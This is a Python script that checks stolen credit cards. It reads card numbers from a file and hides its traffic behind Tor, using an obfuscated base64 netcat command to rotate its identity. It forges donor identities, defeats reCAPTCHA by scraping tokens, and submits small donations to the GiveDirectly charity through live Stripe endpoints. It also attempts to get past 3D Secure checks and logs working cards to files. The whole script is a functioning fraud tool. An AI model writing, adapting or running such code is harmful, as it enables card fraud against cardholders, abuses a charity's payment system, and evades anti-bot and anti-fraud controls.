from urllib.parse import urlencode
import requests
import regex
from bs4 import BeautifulSoup
import json
import socks
import socket
import os
import random


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket
inputs = input('Enter File Path : ')
amount = [100,200,150,199,125,198]


file_open = inputs

with open(file_open,'r') as file:
    cards = file.read().split('\n')
    
    for card in cards:
        try:
          o = os.system("echo QVVUSEVOVElDQVRFICJkaHJ1diINCnNpZ25hbCBORVdOWU0NClFVSVQK | base64 -d | nc 127.0.0.1 9051 1>/dev/null")
          lista = card.split('|')
          cardw = lista[0][:4]+'+'+lista[0][4:8]+'+'+lista[0][8:12]+'+'+lista[0][12:16]
          srt2 = requests.get('https://randomuser.me/api/')
          srt = srt2.text
          data = json.loads(srt)
          email = data["results"][0]["email"]
          first = data["results"][0]["name"]["first"]
          last = data["results"][0]["name"]["last"]
          api_url = "https://m.stripe.com/6"
          dd = ''

          ms = requests.post(api_url , dd)
          tf = ms.text
          
          tx = json.loads(tf)
          guid = tx['guid']
          muid = tx['muid']
          sid = tx['sid']

          # recaptcha bypass starts          
          input_string = requests.get('https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf')
          html = input_string.text
          expyear = lista[2][2]
          expyear2 =  lista[2][3]
          expyear3 = expyear+expyear2
# getting recaptcha token value
          soup = BeautifulSoup(html, 'html.parser')
          recaptcha_token_input = soup.find('input', id='recaptcha-token')
          token = recaptcha_token_input['value']


          
          
          url = 'https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa'
          data = {
              "v": "pCoGBhjs9s8EhFOHJFe8cqis",
              "k": "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
              "reason": "q",
              "c": token, 
              "co": "aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.",
              "hl": "en",
              "size": "invisible",
              "chr": "%5B79%2C17%2C39%5D",
              "vh": "13599012192",
              "bg": "!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ",
}

          query_string = urlencode(data)
          head = {

            "accept" : "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.google.com",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
            "pragma": "no-cache",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf",
         
}

          resp = requests.post(url , data , headers=head)

          ff = resp.text

          pattern = r'\["rresp","(.*?)"'
          match = regex.search(pattern, ff)
          
          gcap = match.group(1)
          
          sigm = email.replace("@","%40")

          
          
          url2 = '	https://www-backend.givedirectly.org/payment-intent'
          am  = random.choice(amount)
          data2 =  {      
                "cents" : am,
                "frequency" : "once",
                "directDonationTo" : "unrestricted",
                "emailAddress" : email,
                "firstName" : first,
                "lastName" : last,
                "recaptchaResponse" : gcap ,
                "subscribeToEmailList" : True,
}
          
          jjdata = json.dumps(data2)

          head2 = {
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
                 "content-type" : "application/json"
 
}
          
          cliid = requests.post(url2 , jjdata , headers=head2)

          
          hh = cliid.text
          if 'rejected' in hh :
            print ('req is :'+hh)
            exit()
              
          
          jk = json.loads(hh)
          
          cli = jk['clientSecret']
          pi = jk['paymentIntent']
      
          
          



          urlst = 'https://api.stripe.com/v1/payment_intents/'+pi+'/confirm'

          strhead = {
    
                "Content-Type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",


}
          datastrip = 'return_url=https://0.0.0.0&payment_method_data[type]=card&payment_method_data[card][number]='+cardw+'&payment_method_data[card][cvc]='+lista[3]+'&payment_method_data[card][exp_year]='+expyear3+'&payment_method_data[card][exp_month]='+lista[1]+'&payment_method_data[billing_details][address][postal_code]=90024&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]='+sigm+'&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F08d3883199%3B+stripe-js-v3%2F08d3883199%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fdonate.givedirectly.org&payment_method_data[time_on_page]=107103&payment_method_data[guid]='+guid+'+&payment_method_data[muid]='+muid+'&payment_method_data[sid]='+sid+'&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=payment&client_context[setup_future_usage]=off_session&use_stripe_sdk=true&key=pk_live_B3imPhpDAew8RzuhaKclN4Kd&client_secret='+cli
           
          
          strresp = requests.post(urlst,datastrip,headers=strhead)

          rr = strresp.text 
          
          data = json.loads(rr)
          try:
             code = data["error"]["decline_code"]
             if code == 'generic_decline' or code == 'card_declined' :
              print('card declined')
             elif 'authentication_required' == code :
              print('authentication required :'+card)
             elif 'merchant_blacklist' == code :
              print('card is blacklisted : '+card)
             else :
              print(code+'  card number is '+card)
              with open('/home/kali/Hited.txt', 'a') as file:
                file.write(code+'  '+cardw)
          except Exception as jj :
            try:
              # checking if 3D auth is or not 
              paytt  = data["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"]
              Durl = 'https://api.stripe.com/v1/3ds2/authenticate'
              Ddata = 'source='+paytt+'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22768%22%2C%22browserScreenWidth%22%3A%221366%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(X11%3B+Linux+x86_64%3B+rv%3A91.0)+Gecko%2F20100101+Firefox%2F91.0%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key=pk_live_B3imPhpDAew8RzuhaKclN4Kd'
              Dhead = {
"Content-Type": "application/x-www-form-urlencoded",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
"Accept": "application/json",
"Accept-Language": "en-US,en;q=0.5",
              }
              au = requests.post(Durl,Ddata,headers=Dhead)
              st = json.loads(au.text)
              state = st["state"]
              if state == "challenge_required" :
                treeid = st["ares"]["threeDSServerTransID"]
                areid = st["ares"]["acsTransID"]
                Chead = {
    
                "Content-Type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",


}
                Curi = 'https://api.stripe.com/v1/3ds2/challenge_complete'
                Cdata = 'source=payatt_2ODnGMDCmk4pRvPl0INIv2KJ&final_cres=%7B%22threeDSServerTransID%22%3A%22'+treeid+'%22%2C%22messageType%22%3A%22CRes%22%2C%22messageVersion%22%3A%222.1.0%22%2C%22acsTransID%22%3A%22'+areid+'%22%2C%22transStatus%22%3A%22N%22%7D&key=pk_live_B3imPhpDAew8RzuhaKclN4Kd'
                arcd = requests.post(Curi,Cdata,headers=Chead)
                stat = json.loads(arcd.text)
                staat = ["state"]
                if staat == "failed":
                  print("Caller issue ")
                else :
                  print("auth card is saved")
                  with open('/home/kali/HitAu.txt', 'a') as file:
                    file.write(code+'  '+cardw)
              else :
                print(rr+' state')        
            except :
              with open('/home/kali/Hit.txt', 'a') as file:
                file.write(code+'  '+cardw)

        except Exception as e : 
          print(e)
#           head3 = {
#                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
#                  "content-type" : "application/json"
 
# }
          
          
#           uri = 'https://api.stripe.com/v1/payment_intents/'+pi+'?key=pk_live_B3imPhpDAew8RzuhaKclN4Kd&is_stripe_sdk=false&client_secret='+cli
#           req = requests.get(uri,headers=head3)
#           dad  = json.loads(req.text)
#           print('req is '+dad)
          # decline_code = dad["last_payment_error"]["decline_code"]
          
          # if decline_code == 'generic_decline' or decline_code == 'card_declined' :
          #   print('card declined')
          # elif 'authentication_required' == decline_code :
          #   print('authentication required :'+card)
          # elif 'merchant_blacklist' == decline_code :
          #   print('card is blacklisted : '+card)
          # else :
          #   print(decline_code+'  card number is '+card)
          #   with open('/home/kali/Hited.txt', 'a') as file:
          #     file.write(code+'  '+cardw)
